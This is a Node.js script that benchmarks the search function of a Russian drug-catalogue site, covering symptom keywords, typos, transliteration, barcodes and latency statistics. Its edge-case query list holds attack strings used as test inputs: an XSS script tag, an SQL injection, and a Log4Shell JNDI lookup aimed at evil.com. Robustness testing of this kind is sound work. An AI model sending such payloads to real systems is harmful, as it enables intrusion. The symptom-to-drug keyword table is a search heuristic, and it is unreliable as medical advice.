const fs = require('fs');

const raw = fs.readFileSync('/home/vkusny/Рабочий стол/Тестовый/site/data/drugs.json', 'utf8');
const j = JSON.parse(raw);

const norm = (s) => String(s || "").toLowerCase().replace(/ё/g, "е").replace(/[®™©]/g, "").replace(/[^0-9a-zа-я]+/g, " ").trim();
const LAT = [["sch", "щ"], ["sh", "ш"], ["ch", "ч"], ["zh", "ж"], ["ts", "ц"], ["ya", "я"], ["yu", "ю"], ["yo", "е"], ["kh", "х"], ["ph", "ф"], ["a", "а"], ["b", "б"], ["c", "к"], ["d", "д"], ["e", "е"], ["f", "ф"], ["g", "г"], ["h", "х"], ["i", "и"], ["j", "дж"], ["k", "к"], ["l", "л"], ["m", "м"], ["n", "н"], ["o", "о"], ["p", "п"], ["q", "к"], ["r", "р"], ["s", "с"], ["t", "т"], ["u", "у"], ["v", "в"], ["w", "в"], ["x", "кс"], ["y", "и"], ["z", "з"]];
const translit = (s) => { let o = ""; for (let i = 0; i < s.length;) { const hit = LAT.find(([l]) => s.startsWith(l, i)); if (hit) { o += hit[1]; i += hit[0].length; } else { o += s[i]; i++; } } return o; };
const FORM_RX = /,|\s(?=(табл|таб\.|капс|р-р|раствор|сироп|мазь|крем|гель|суппоз|свечи|порош|пор\.|капли|спрей|аэрозол|суспенз|лиофил|драже|гранул|пастил|эмульс|концентрат|шипуч|жеват|д\/|для\s))/i;

function splitName(name) {
  const n = name.replace(/\s+/g, " ").trim();
  const m = n.match(FORM_RX);
  if (m && m.index >= 2) {
    const title = n.slice(0, m.index).trim();
    let sub = n.slice(m.index).replace(/^[,\s]+/, "");
    sub = sub.charAt(0).toUpperCase() + sub.slice(1);
    return { title, sub };
  }
  return { title: n, sub: "" };
}

function formOf(n) {
  const s = n.toLowerCase();
  if (/глазн/.test(s)) return "Глазные капли";
  if (/ушн/.test(s)) return "Ушные капли";
  if (/назал|для носа|в нос/.test(s)) return "Для носа";
  if (/инъекц|инфуз|ампул|в\/в|в\/м|внутривен|внутримыш|д\/ин|для ин|лиофил|подкожн/.test(s)) return "Инъекции";
  if (/спрей|аэрозол|ингал/.test(s)) return "Спрей";
  if (/сироп/.test(s)) return "Сироп";
  if (/суспенз/.test(s)) return "Суспензия";
  if (/мазь/.test(s)) return "Мазь";
  if (/крем/.test(s)) return "Крем";
  if (/гель/.test(s)) return "Гель";
  if (/суппоз|свеч/.test(s)) return "Свечи";
  if (/капс/.test(s)) return "Капсулы";
  if (/табл|таб\.|таб\b|драже|пастил/.test(s)) return "Таблетки";
  if (/порош|пор\.|саше|гранул|\bпак/.test(s)) return "Порошок";
  if (/капли/.test(s)) return "Капли";
  if (/раствор|р-р/.test(s)) return "Раствор";
  return "";
}

function prep(r, i) {
  const [name, mnn, prod, country, price, bc, img, reg] = r;
  const n = norm(name), m = norm(mnn);
  const { title, sub } = splitName(name);
  return { i, name, mnn, prod, country, price, bc, img, reg, n, m, w: n.split(" "), mw: m ? m.split(" ") : [], title, sub, form: formOf(name), b: n.split(" ")[0] || "" };
}

const tri = (w) => { const s = `  ${w} `; const set = new Set(); for (let i = 0; i < s.length - 2; i++) set.add(s.slice(i, i + 3)); return set; };

const memStart = process.memoryUsage().rss;
const tStart = Date.now();
const ROWS = j.rows.map(prep);
const BRANDS = new Map();
for (const r of ROWS) {
  if (r.b.length >= 4) {
    if (!BRANDS.has(r.b)) BRANDS.set(r.b, []);
    BRANDS.get(r.b).push(r.i);
  }
}
const loadTimeMs = Date.now() - tStart;
const memUsedMb = (process.memoryUsage().rss - memStart) / (1024 * 1024);

const INDICATIONS = {
  "грипп": ["парацетамол", "ибупрофен", "ацетилсалицил", "эргоферон", "ингавирин", "римантадин", "осельтамивир", "терафлю", "колдрекс", "антигриппин", "фервекс", "гриппостад"],
  "простуд": ["парацетамол", "ибупрофен", "ацетилсалицил", "эргоферон", "терафлю", "колдрекс", "фервекс"],
  "орви": ["парацетамол", "ибупрофен", "эргоферон", "ингавирин"],
  "температур": ["парацетамол", "ибупрофен", "ацетилсалицил", "анальгин"],
  "жар": ["парацетамол", "ибупрофен", "ацетилсалицил"],
  "лихорад": ["парацетамол", "ибупрофен"],
  "давлен": ["эналаприл", "каптоприл", "лозартан", "амлодипин", "бисопролол", "лизиноприл", "индапамид", "валсартан", "периндоприл"],
  "гипертон": ["эналаприл", "каптоприл", "лозартан", "амлодипин", "бисопролол"],
  "бол": ["цитрамон", "анальгин", "ибупрофен", "нурофен", "кетонал", "кеторол", "пенталгин", "спазмалгон", "но шпа", "дротаверин", "новиган"],
  "голов": ["цитрамон", "анальгин", "ибупрофен", "нурофен", "пенталгин", "спазмалгон"],
  "мигрен": ["цитрамон", "ибупрофен", "суматриптан", "пенталгин"],
  "живот": ["но шпа", "дротаверин", "мезим", "панкреатин", "креон", "омепразол", "алмагель", "эспумизан", "смекта", "пробинекс"],
  "желуд": ["омепразол", "алмагель", "де нол", "но шпа", "мезим", "ренни"],
  "изжог": ["омепразол", "алмагель", "ренни", "маалокс", "пантопразол"],
  "спазм": ["но шпа", "дротаверин", "спазмалгон"],
  "пищевар": ["мезим", "панкреатин", "креон", "пробинекс", "линекс"],
  "тошнот": ["церукал", "метоклопрамид", "мотилиум", "домперидон"],
  "рвот": ["церукал", "метоклопрамид", "мотилиум"],
  "аллерг": ["лоратадин", "супрастин", "цетиризин", "цетрин", "зодак", "диазолин", "дезлоратадин"],
  "зуд": ["лоратадин", "супрастин", "цетиризин"],
  "кашл": ["амброксол", "лазолван", "ацц", "ацетилцистеин", "бромгексин", "мукалтин", "синекод", "гербион", "доктор мом"],
  "бронхит": ["амброксол", "ацц", "бромгексин", "амоксициллин"],
  "горл": ["стрепсилс", "граммидин", "септолете", "гексорал", "лизобакт", "тантум", "мирамистин", "фурацилин"],
  "ангин": ["амоксициллин", "стрепсилс", "гексорал", "мирамистин", "граммидин"],
  "нос": ["ксилометазолин", "оксиметазолин", "називин", "тизин", "отривин", "сноп", "аква марис", "пиносол"],
  "насморк": ["ксилометазолин", "оксиметазолин", "називин", "тизин", "отривин", "сноп"],
  "сопл": ["ксилометазолин", "називин", "тизин", "сноп"],
  "успоко": ["валериана", "пустырник", "корвалол", "валидол", "глицин", "ново пассит", "афобазол"],
  "сон": ["валериана", "пустырник", "мелатонин", "глицин", "корвалол"],
  "стресс": ["афобазол", "ново пассит", "глицин", "магний в6", "валериана"],
  "сердц": ["валидол", "корвалол", "нитроглицерин", "кардиомагнил", "аспаркам"],
  "печен": ["эссенциале", "карсил", "урсосан", "урсодезоксихолевая", "гептрал"],
  "антибиот": ["амоксициллин", "азитромицин", "цефтриаксон", "клавокси", "левофлоксацин"],
  "витамин": ["аскорбиновая кислота", "витамин с", "пиковит", "компливит", "супрадин"],
  "диаре": ["лоперамид", "имодиум", "смекта", "регидрон", "энтерол", "полисорб"],
  "понос": ["лоперамид", "имодиум", "смекта", "регидрон"]
};

function scoreRow(r, toks, full) {
  let s = 0;
  if (r.n.startsWith(full)) s = 100; else if (r.m && r.m.startsWith(full)) s = 80;
  for (const t of toks) {
    let hit = 0;
    for (const w of r.w) if (w.startsWith(t)) { hit = 2; break; }
    if (!hit) for (const w of r.mw) if (w.startsWith(t)) { hit = 2; break; }
    if (!hit && t.length >= 3 && r.n.includes(t)) hit = 1;
    if (!hit) return 0;
    s += hit * 10;
  }
  if (r.img >= 0) s += 3;
  if (r.price) s += 2;
  if (r.form && r.form !== "Инъекции") s += 1;
  return s;
}

function search(q, limit = 60) {
  if (!ROWS) return [];
  const raw = q.trim();
  if (!raw) return [];
  const digits = raw.replace(/\s/g, "");
  if (/^\d{8,14}$/.test(digits)) return byBarcode(digits);
  const v1 = norm(raw);
  const variants = [v1];
  if (/[a-z]/.test(v1)) variants.push(translit(v1));
  const best = new Map();

  // 1. Умный поиск по симптомам / описанию
  const targetKws = new Set();
  for (const [k, arr] of Object.entries(INDICATIONS)) {
    if (v1.includes(k)) for (const w of arr) targetKws.add(w);
  }
  const wantsForm = formOf(v1);
  if (targetKws.size) {
    for (const r of ROWS) {
      for (const kw of targetKws) {
        if (r.n.includes(kw) || (r.m && r.m.includes(kw))) {
          let s = 70;
          if (wantsForm && r.form && r.form.toLowerCase().includes(wantsForm.toLowerCase())) s += 25;
          if (r.price) s += 5;
          if (s > (best.get(r.i) || 0)) best.set(r.i, s);
          break;
        }
      }
    }
  }

  // 2. Прямой поиск по словам
  for (const v of variants) {
    const toks = v.split(" ").filter((t) => t && t !== "от" && t !== "для" && t !== "при");
    if (!toks.length) continue;
    for (const r of ROWS) {
      const s = scoreRow(r, toks, v);
      if (s > (best.get(r.i) || 0)) best.set(r.i, s);
    }
  }

  // 3. Опечатки по триграммам
  if (best.size < 3) {
    const v = variants[variants.length - 1].split(" ")[0];
    if (v && v.length >= 4) {
      const A = tri(v);
      for (const [b, ids] of BRANDS) {
        const B = tri(b);
        let inter = 0;
        for (const x of A) if (B.has(x)) inter++;
        const sim = inter / (A.size + B.size - inter);
        if (sim >= 0.38) {
          for (const id of ids) {
            if (!best.has(id)) best.set(id, Math.round(sim * 30));
          }
        }
      }
    }
  }

  return [...best.entries()]
    .sort((a, b) => b[1] - a[1] || ROWS[a[0]].name.length - ROWS[b[0]].name.length)
    .slice(0, limit)
    .map(([i]) => ROWS[i]);
}

function byBarcode(code) {
  if (!ROWS) return [];
  const c = code.replace(/^0+/, "");
  return ROWS.filter((r) => r.bc && r.bc.split(",").some((b) => b.replace(/^0+/, "") === c));
}

console.log('='.repeat(60));
console.log('NODE.JS / SITE APP.JS SEARCH BENCHMARK');
console.log('='.repeat(60));
console.log(`Loaded in ${loadTimeMs} ms, ${ROWS.length} drugs, ${BRANDS.size} unique brands`);
console.log(`Memory RSS delta: ${memUsedMb.toFixed(2)} MB`);

const queries = {
  'Symptoms (40)': [
    'таблетки от гриппа', 'от давления', 'болит живот', 'от головной боли',
    'жаропонижающее', 'от аллергии', 'успокоительное', 'от кашля',
    'от изжоги', 'антибиотик', 'от простуды', 'от температуры',
    'высокая температура', 'лихорадка', 'жар', 'гипертония',
    'от давления таблетки', 'болит голова', 'мигрень', 'сильная боль',
    'боль в желудке', 'желудок', 'спазм', 'для пищеварения',
    'тошнота', 'рвота', 'зуд', 'бронхит',
    'болит горло', 'ангина', 'капли в нос', 'насморк',
    'сопли', 'для сна', 'от стресса', 'для сердца',
    'для печени', 'витамины', 'диарея', 'понос'
  ],
  'Typos & Fuzzy (40)': [
    'парацетамал', 'цытрамон', 'ибупрафен', 'эналаприлл',
    'аспиринн', 'ношпа', 'аналгин', 'супрастен',
    'мезим фортее', 'амбраксол', 'кетанав', 'омепразолл',
    'азитрамицин', 'диклофинак', 'лоратадын', 'пантенолл',
    'валокордин', 'корвалолл', 'глицын', 'бисопралол',
    'амоксицилин', 'цефтриаксонн', 'дротаверинн', 'креонн',
    'реннии', 'маалоксс', 'афобазолл', 'валидолл',
    'карсил', 'эссенсиале', 'лоперамидд', 'смектаа',
    'полисорбб', 'эргоферонн', 'ингавиринн', 'нимесилл',
    'спазмалгоон', 'кеторолл', 'називинн', 'отривинн'
  ],
  'Latin & Translit (35)': [
    'paracetamol', 'no-shpa', 'aspirin', 'analgin',
    'ibuprofen', 'enalapril', 'amoxicillin', 'azithromycin',
    'ceftriaxone', 'citramon', 'suprastin', 'loratadine',
    'omeprazole', 'mezim', 'ketorol', 'ketonal',
    'spasmalgon', 'diclofenac', 'bisoprolol', 'nurofen',
    'teraflyu', 'coldrex', 'smecta', 'loperamide',
    'glycine', 'validol', 'corvalol', 'ambroxol',
    'nazivin', 'otrivin', 'creon', 'pancreatin',
    'afobazol', 'karsil', 'ergofeon'
  ],
  'Barcodes (25)': [
    '46012345', '46070032', ' 46070032 ', '460 700 32',
    '0000000046070032', '0046070032', '006487201701', '052152017009',
    ' 006487201701 ', '006 487 201 701', '4840944000294', '4840944000300',
    '4607003241234', ' 4840944000294 ', '484 0944 000 294', '04840944000294',
    '0797776554249', '14607003241231', ' 14607003241231 ', '1460 7003 2412 31',
    '0014607003241231', '1234567', '123456789012345', '00000000', '0000000000000'
  ],
  'Edge Cases & Invalid (25)': [
    '', '   ', '\t\n\r', 'а', 'z', '1',
    'от', 'для', 'при', 'от для при',
    '!!!???***', '💊', '💊💉🩺', 'таблетки 💊',
    '<script>alert("xss")</script>', '\' OR \'1\'=\'1', 'SELECT * FROM drugs;',
    '${jndi:ldap://evil.com/a}', 'парацетамол ' + 'а'.repeat(50),
    'а'.repeat(500), '[(.*+?^=!:${}()|[\\]/\\\\', '   но   шпа   ',
    'ПАРАЦЕТАМОЛ', 'пАрАцЕтАмОл', 'paracetamol 500mg №10 таб'
  ]
};

// Warmup
for (const qList of Object.values(queries)) {
  for (const q of qList) search(q);
}

const allLatenciesUs = [];
let totalQueries = 0;
let totalFound = 0;
const detailedResults = [];

for (const [cat, qList] of Object.entries(queries)) {
  const catLatenciesUs = [];
  let catFound = 0;

  for (const q of qList) {
    totalQueries++;
    const iters = 10;
    const t0 = process.hrtime.bigint();
    let res = [];
    for (let i = 0; i < iters; i++) {
      res = search(q);
    }
    const t1 = process.hrtime.bigint();
    const avgUs = Number(t1 - t0) / (iters * 1000);
    catLatenciesUs.push(avgUs);
    allLatenciesUs.push(avgUs);

    if (res.length > 0) {
      catFound++;
      totalFound++;
    }

    detailedResults.push({
      category: cat,
      query: q.length > 30 ? q.slice(0, 27) + '...' : q,
      latency_ms: (avgUs / 1000).toFixed(2),
      found_count: res.length,
      top_hit: res.length ? res[0].name : '<none>'
    });
  }

  catLatenciesUs.sort((a, b) => a - b);
  const avgMs = (catLatenciesUs.reduce((a, b) => a + b, 0) / catLatenciesUs.length) / 1000;
  const p50Ms = catLatenciesUs[Math.floor(catLatenciesUs.length * 0.5)] / 1000;
  const p95Ms = catLatenciesUs[Math.floor(catLatenciesUs.length * 0.95)] / 1000;
  const maxMs = catLatenciesUs[catLatenciesUs.length - 1] / 1000;

  console.log(`\n[${cat}]`);
  console.log(`  - Queries: ${qList.length}, Found: ${catFound} (${((catFound / qList.length) * 100).toFixed(1)}%)`);
  console.log(`  - Latency: Avg ${avgMs.toFixed(2)} ms | P50 ${p50Ms.toFixed(2)} ms | P95 ${p95Ms.toFixed(2)} ms | Max ${maxMs.toFixed(2)} ms`);
}

allLatenciesUs.sort((a, b) => a - b);
const overallAvgMs = (allLatenciesUs.reduce((a, b) => a + b, 0) / allLatenciesUs.length) / 1000;
const overallP50Ms = allLatenciesUs[Math.floor(allLatenciesUs.length * 0.5)] / 1000;
const overallP95Ms = allLatenciesUs[Math.floor(allLatenciesUs.length * 0.95)] / 1000;
const overallP99Ms = allLatenciesUs[Math.floor(allLatenciesUs.length * 0.99)] / 1000;
const overallMaxMs = allLatenciesUs[allLatenciesUs.length - 1] / 1000;
const rps = 1000 / overallAvgMs;

console.log('\n' + '='.repeat(60));
console.log('OVERALL JS / SITE PERFORMANCE SUMMARY:');
console.log('='.repeat(60));
console.log(`Total queries tested: ${totalQueries}`);
console.log(`Success rate (found > 0): ${totalFound} / ${totalQueries} (${((totalFound / totalQueries) * 100).toFixed(1)}%)`);
console.log(`Average Latency: ${overallAvgMs.toFixed(2)} ms`);
console.log(`P50 Latency:     ${overallP50Ms.toFixed(2)} ms`);
console.log(`P95 Latency:     ${overallP95Ms.toFixed(2)} ms`);
console.log(`P99 Latency:     ${overallP99Ms.toFixed(2)} ms`);
console.log(`Max Latency:     ${overallMaxMs.toFixed(2)} ms`);
console.log(`Estimated RPS:   ${rps.toFixed(0)} RPS`);

fs.writeFileSync('/home/vkusny/Рабочий стол/Тестовый/site/benchmark_js_results.json', JSON.stringify({
  timestamp: new Date().toISOString(),
  drugs_count: ROWS.length,
  memory_rss_mb: memUsedMb,
  total_queries: totalQueries,
  total_found: totalFound,
  rps,
  latency_avg_ms: overallAvgMs,
  latency_p50_ms: overallP50Ms,
  latency_p95_ms: overallP95Ms,
  latency_p99_ms: overallP99Ms,
  latency_max_ms: overallMaxMs,
  details: detailedResults
}, null, 2));
